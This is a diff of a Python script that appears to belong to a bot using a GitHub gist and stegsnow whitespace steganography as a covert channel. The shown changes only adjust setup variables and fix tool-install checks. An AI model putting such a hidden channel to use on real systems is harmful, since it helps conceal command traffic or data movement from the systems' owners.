@@ -2,11 +2,14 @@ import os
 import time
 import base64
 
+##### EDITABLE USER VARIABLES #######################
 GIST_ID = "799938c0850a634dfe9ce73436a00de0" #ID of github.gist
 BOT_I = 1
 
 INSTALL_TOOLS = True # Are gh and stegsnow already installed
-LOGIN = False # login needed
+LOGIN = True # login needed
+
+################################################
 
 # used filenames
 coverage_fn  = 'short1.txt'
@@ -25,14 +28,14 @@ def install_tools():
     """
     print("=> Installing necessary tools..")
     ret = os.popen(f'gh').read().split()
-    if ret[0] == "bash:": # gh not installed yet
+    if not ret or ret[0] == "bash:": # gh not installed yet
         os.system(f'curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg')
         os.system('echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null')
         os.system('sudo apt update')
         os.system('sudo apt install gh')
     print("\tGH installed.")
     ret = os.popen(f'stegsnow -h').read().split()
-    if ret[0] == "bash:": # stegsnow not installed yet
+    if not ret or ret[0] == "bash:": # stegsnow not installed yet
         os.system(f'sudo apt-get install stegsnow')
     print("\tStegsnow installed.")
 
